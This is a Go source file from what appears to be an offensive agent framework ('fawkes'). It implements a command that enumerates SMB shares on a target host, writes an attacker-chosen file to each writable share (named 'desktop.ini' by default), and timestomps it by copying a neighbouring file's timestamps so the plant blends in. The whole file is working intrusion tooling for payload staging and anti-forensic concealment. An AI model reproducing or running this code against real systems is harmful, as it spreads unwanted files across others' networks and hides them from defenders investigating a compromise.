package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"github.com/hirochachacha/go-smb2"
)

// smbTaintResult is the structured JSON output from a taint operation.
type smbTaintResult struct {
	Action       string            `json:"action"`
	Host         string            `json:"host"`
	PlantName    string            `json:"plant_name"`
	SharesTested int               `json:"shares_tested"`
	Planted      []smbPlantedFile  `json:"planted"`
	Skipped      []smbSkippedShare `json:"skipped"`
}

// smbPlantedFile tracks a file planted on a share.
type smbPlantedFile struct {
	Share       string `json:"share"`
	Path        string `json:"path"`
	Size        int    `json:"size"`
	Timestomped bool   `json:"timestomped"`
	StompSource string `json:"stomp_source,omitempty"`
}

// smbSkippedShare tracks shares that were skipped.
type smbSkippedShare struct {
	Share  string `json:"share"`
	Reason string `json:"reason"`
}

// smbTaintShares discovers writable shares on a target host, plants a file on each,
// and timestomps the planted file to blend in with existing files.
func smbTaintShares(args smbArgs) structs.CommandResult {
	// Read the file to plant
	var plantData []byte
	if args.Source != "" {
		var err error
		plantData, err = os.ReadFile(args.Source)
		if err != nil {
			return errorf("Error reading source file %s: %v", args.Source, err)
		}
	} else {
		plantData = []byte(args.Content)
	}
	if len(plantData) == 0 {
		return errorResult("Error: plant file is empty")
	}
	defer structs.ZeroBytes(plantData)

	// Determine plant filename
	plantName := args.PlantName
	if plantName == "" && args.Source != "" {
		plantName = filepath.Base(args.Source)
	}
	if plantName == "" {
		plantName = "desktop.ini"
	}

	// Connect to target
	sc, err := smbConnect(args)
	if err != nil {
		return errorf("Error: %v", err)
	}
	defer sc.close()

	// Enumerate shares
	sc.setDeadline(smbOperationTimeout)
	shareNames, err := sc.session.ListSharenames()
	sc.clearDeadline()
	if err != nil {
		return errorf("Error listing shares on %s: %v", args.Host, err)
	}

	result := smbTaintResult{
		Action:       "taint",
		Host:         args.Host,
		PlantName:    plantName,
		SharesTested: len(shareNames),
	}

	// If a specific share was specified, only taint that one
	targetShares := shareNames
	if args.Share != "" {
		targetShares = []string{args.Share}
		result.SharesTested = 1
	}

	for _, shareName := range targetShares {
		// Skip IPC$ — not a file share
		if strings.EqualFold(shareName, "IPC$") {
			result.Skipped = append(result.Skipped, smbSkippedShare{
				Share: shareName, Reason: "IPC$ is not a file share",
			})
			continue
		}

		planted, skipped := smbTaintSingleShare(sc, args.Host, shareName, plantName, args.Path, plantData)
		if planted != nil {
			result.Planted = append(result.Planted, *planted)
		}
		if skipped != nil {
			result.Skipped = append(result.Skipped, *skipped)
		}
	}

	output, _ := json.Marshal(result)
	return successResult(string(output))
}

// smbTaintSingleShare attempts to plant a file on a single share.
// Returns either a planted file entry or a skipped share entry.
func smbTaintSingleShare(sc *smbConn, host, shareName, plantName, targetPath string, plantData []byte) (*smbPlantedFile, *smbSkippedShare) {
	// Mount the share
	sc.setDeadline(smbOperationTimeout)
	share, err := sc.session.Mount(shareName)
	sc.clearDeadline()
	if err != nil {
		return nil, &smbSkippedShare{
			Share:  shareName,
			Reason: fmt.Sprintf("mount failed: %v", err),
		}
	}
	defer func() { _ = share.Umount() }()

	// Determine target directory
	dir := targetPath
	if dir == "" {
		dir = "."
	}

	// Check if directory is readable (also tells us if it exists)
	sc.setDeadline(smbOperationTimeout)
	entries, err := share.ReadDir(dir)
	sc.clearDeadline()
	if err != nil {
		return nil, &smbSkippedShare{
			Share:  shareName,
			Reason: fmt.Sprintf("cannot read directory '%s': %v", dir, err),
		}
	}

	// Build the full path for the planted file
	plantPath := plantName
	if dir != "." && dir != "" {
		plantPath = filepath.Join(dir, plantName)
	}
	// Normalize to forward slashes for SMB
	plantPath = strings.ReplaceAll(plantPath, "\\", "/")

	// Try to write the file — this tests write access
	sc.setDeadline(smbOperationTimeout)
	f, err := share.OpenFile(plantPath, os.O_WRONLY|os.O_CREATE|os.O_EXCL, 0644)
	sc.clearDeadline()
	if err != nil {
		// O_EXCL failed — file might already exist or share is read-only
		if isPermissionError(err) {
			return nil, &smbSkippedShare{
				Share:  shareName,
				Reason: "write access denied",
			}
		}
		return nil, &smbSkippedShare{
			Share:  shareName,
			Reason: fmt.Sprintf("cannot create file '%s': %v", plantPath, err),
		}
	}

	sc.setDeadline(smbOperationTimeout)
	n, writeErr := f.Write(plantData)
	_ = f.Close()
	sc.clearDeadline()
	if writeErr != nil {
		// Clean up partial write
		_ = share.Remove(plantPath)
		return nil, &smbSkippedShare{
			Share:  shareName,
			Reason: fmt.Sprintf("write failed: %v", writeErr),
		}
	}

	planted := &smbPlantedFile{
		Share: shareName,
		Path:  plantPath,
		Size:  n,
	}

	// Timestomp: find a nearby file and copy its timestamps
	stomped := smbTimestompPlanted(sc, share, plantPath, dir, entries)
	planted.Timestomped = stomped.success
	planted.StompSource = stomped.sourceFile

	return planted, nil
}

// smbStompResult holds the result of a timestomp attempt.
type smbStompResult struct {
	success    bool
	sourceFile string
}

// smbTimestompPlanted copies timestamps from an existing file in the same directory
// to the planted file, making it blend in.
func smbTimestompPlanted(sc *smbConn, share *smb2.Share, plantPath, dir string, entries []os.FileInfo) smbStompResult {
	// Find a regular file (not directory) to copy timestamps from
	// Prefer files with similar extensions, then any file
	plantExt := strings.ToLower(filepath.Ext(plantPath))
	var bestMatch os.FileInfo
	var anyFile os.FileInfo

	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}
		name := entry.Name()
		// Skip our planted file
		if strings.EqualFold(name, filepath.Base(plantPath)) {
			continue
		}
		if anyFile == nil {
			anyFile = entry
		}
		if strings.ToLower(filepath.Ext(name)) == plantExt && plantExt != "" {
			bestMatch = entry
			break
		}
	}

	stompSource := bestMatch
	if stompSource == nil {
		stompSource = anyFile
	}
	if stompSource == nil {
		return smbStompResult{success: false}
	}

	// Apply the source file's modification time to the planted file
	targetTime := stompSource.ModTime()
	sc.setDeadline(smbOperationTimeout)
	err := share.Chtimes(plantPath, targetTime, targetTime)
	sc.clearDeadline()
	if err != nil {
		return smbStompResult{success: false}
	}

	sourcePath := stompSource.Name()
	if dir != "." && dir != "" {
		sourcePath = filepath.Join(dir, stompSource.Name())
	}
	return smbStompResult{success: true, sourceFile: sourcePath}
}

// isPermissionError checks if an error indicates a permission/access denied condition.
func isPermissionError(err error) bool {
	if err == nil {
		return false
	}
	errStr := strings.ToLower(err.Error())
	return strings.Contains(errStr, "access") && strings.Contains(errStr, "denied") ||
		strings.Contains(errStr, "permission") ||
		strings.Contains(errStr, "STATUS_ACCESS_DENIED") ||
		strings.Contains(errStr, "status_access_denied")
}

// smbCheckWriteAccess is a helper used by tests. It tries to create+delete a temp file.
func smbCheckWriteAccess(share *smb2.Share, dir string) bool {
	testPath := filepath.Join(dir, fmt.Sprintf(".fawkes_test_%d", time.Now().UnixNano()))
	testPath = strings.ReplaceAll(testPath, "\\", "/")
	f, err := share.OpenFile(testPath, os.O_WRONLY|os.O_CREATE|os.O_EXCL, 0644)
	if err != nil {
		return false
	}
	_ = f.Close()
	_ = share.Remove(testPath)
	return true
}
